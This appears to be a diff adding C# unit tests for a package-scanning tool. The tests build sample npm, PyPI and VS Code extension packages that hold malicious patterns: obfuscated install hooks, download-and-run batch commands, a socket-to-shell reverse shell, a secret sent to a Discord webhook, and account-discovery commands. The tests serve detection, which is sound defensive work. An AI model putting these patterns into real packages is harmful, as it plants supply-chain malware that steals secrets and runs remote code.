@@ -166,6 +166,21 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void An_install_script_that_decodes_with_xor_and_detaches_and_a_main_that_hides_a_url_or_feeds_fetched_text_to_node_are_noteworthy()
+    {
+        var r = Review(Tgz("dayjs-2.3.12.tgz",
+            ("package/package.json", """{"name":"dayjs-ext","version":"2.3.12","scripts":{"postinstall":"node lib/compile.js"},"main":"index.js"}"""),
+            ("package/lib/compile.js", "var spawn = require('child_process').spawn;\nfunction d(b, k) { var s = ''; for (var i = 0; i < b.length; i++) s += String.fromCharCode(b[i] ^ (i * 13 + k & 0xff)); return s; }\nspawn(process.execPath, [d([82, 167], 9)], { detached: true, stdio: 'ignore' }).unref();"),
+            ("package/index.js", "const K = 'aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvYg==';\nmodule.exports = {};")));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "package/lib/compile.js" } && f.Detail.Contains("outlives", StringComparison.Ordinal));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code", Path: "package/lib/compile.js" } && f.Detail.Contains("XOR", StringComparison.Ordinal));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code", Path: "package/index.js" } && f.Detail.Contains("URL hidden", StringComparison.Ordinal));
+        var fed = Review(Tgz("sdk-1.0.6.tgz", ("package/package.json", """{"name":"sdk","version":"1.0.6","main":"main.js"}"""),
+            ("package/main.js", "const axios = require('axios'), { spawn } = require('child_process');\n(async () => { const s = (await axios.get(process.env.U)).data.content;\nconst c = spawn('node', [], { stdio: ['pipe', 'ignore', 'ignore'] }); c.stdin.write(s); c.stdin.end(); })();")));
+        Assert.Contains(fed.Findings, f => f is { Level: "noteworthy", Category: "remote code", Path: "package/main.js" });
+    }
+
+    [Fact]
     public void A_plain_package_has_nothing_to_review() =>
         Assert.Equal("none", Review(Tgz("left-pad-1.3.0.tgz", ("package/package.json", """{"name":"left-pad","version":"1.3.0","main":"index.js"}"""),
             ("package/index.js", "module.exports = (s, n, c) => String(s).padStart(n, c);"))).Review);
@@ -194,6 +209,20 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal("pypi sdist", r.Ecosystem);
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "dynamic code" } && f.Detail.Contains("downloads", StringComparison.Ordinal));
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process" } && f.Detail.Contains("carries", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_setup_py_install_command_is_read_with_the_local_module_it_imports_and_a_decoded_command_is_noteworthy()
+    {
+        var r = Review(Tgz("netobs-99.6.tar.gz",
+            ("netobs-99.6/PKG-INFO", "Metadata-Version: 2.1\nName: netobs\nVersion: 99.6\n"),
+            ("netobs-99.6/setup.py", "from setuptools import setup\nfrom setuptools.command.install import install\nclass Post(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\nsetup(name='netobs', version='99.6', cmdclass={'install': Post})\n"),
+            ("netobs-99.6/main.py", "import requests, subprocess\ndef m():\n    requests.get('https://example.invalid/t')\n    subprocess.Popen(['tool'], shell=True)\n")));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script", Path: "netobs-99.6/setup.py" } && f.Detail.Contains("launches", StringComparison.Ordinal));
+        var decoded = Review(Tgz("tiny-1.0.0.tar.gz",
+            ("tiny-1.0.0/PKG-INFO", "Metadata-Version: 2.1\nName: tiny\nVersion: 1.0.0\n"),
+            ("tiny-1.0.0/setup.py", "import os, base64, setuptools\ndef b64d(s): return base64.b64decode(s).decode()\nos.system(b64d('ZWNobyBoaQo='))\nsetuptools.setup(name='tiny', version='1.0.0')\n")));
+        Assert.Contains(decoded.Findings, f => f is { Level: "noteworthy", Category: "process" } && f.Detail.Contains("decoded command", StringComparison.Ordinal));
     }
 
     [Fact]
@@ -322,6 +351,37 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal("noteworthy", r.Review);
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "extension/extension.js" });
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "persistence" });
+    }
+
+    [Fact]
+    public void A_vscode_extension_batch_file_that_downloads_a_program_and_starts_it_is_noteworthy()
+    {
+        var pkg = """{"name":"theme","publisher":"acme","version":"1.0.0","main":"./extension.js","activationEvents":["onStartupFinished"]}""";
+        var r = Review(Zip("acme.theme-1.0.0.vsix", ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const { exec } = require('child_process');\nexports.activate = c => exec(`\"${c.asAbsolutePath('scripts/run.bat')}\"`);")),
+            ("extension/scripts/run.bat", U("@echo off\r\nset \"EXE=%TEMP%\\tool.exe\"\r\ncurl -s -L -o \"%EXE%\" \"http://example.invalid/tool.exe\"\r\nif exist \"%EXE%\" start \"\" /B \"%EXE%\"\r\n"))));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "extension/scripts/run.bat" } && f.Detail.Contains("starts it", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_vscode_extension_that_pipes_a_socket_into_a_shell_named_by_a_variable_or_sends_a_key_to_a_webhook_is_noteworthy()
+    {
+        var pkg = """{"name":"helper","publisher":"acme","version":"0.0.1","main":"./extension.js"}""";
+        var shell = Review(Zip("acme.helper-0.0.1.vsix", ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const { exec } = require('child_process'), net = require('net');\nlet cmd = process.platform === 'win32' ? 'cmd.exe' : 'sh';\nconst sh = exec(cmd), s = new net.Socket();\ns.connect(9098, 'example.invalid', () => { s.pipe(sh.stdin); sh.stdout.pipe(s); });"))));
+        Assert.Contains(shell.Findings, f => f is { Level: "noteworthy", Category: "process" } && f.Detail.Contains("reverse shell", StringComparison.Ordinal));
+        var hook = Review(Zip("acme.helper-0.0.2.vsix", ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const url = 'https://discord.com/api/webhooks/1/x';\nexports.activate = async c => { const apiKey = await c.secrets.get('k'); await sendToWebhook(url, `key: ${apiKey}`); };"))));
+        Assert.Contains(hook.Findings, f => f is { Level: "noteworthy", Category: "exfiltration" } && f.Detail.Contains("chat webhook", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_vscode_extension_that_lists_accounts_and_privileges_is_noteworthy()
+    {
+        var pkg = """{"name":"discover","publisher":"acme","version":"0.0.1","main":"./extension.js"}""";
+        var r = Review(Zip("acme.discover-0.0.1.vsix", ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const { execSync } = require('child_process');\nexports.activate = () => execSync('whoami /priv', { encoding: 'utf8' }) + execSync('net user');"))));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "host details" } && f.Detail.Contains("privilege", StringComparison.Ordinal));
     }
 
     [Fact]
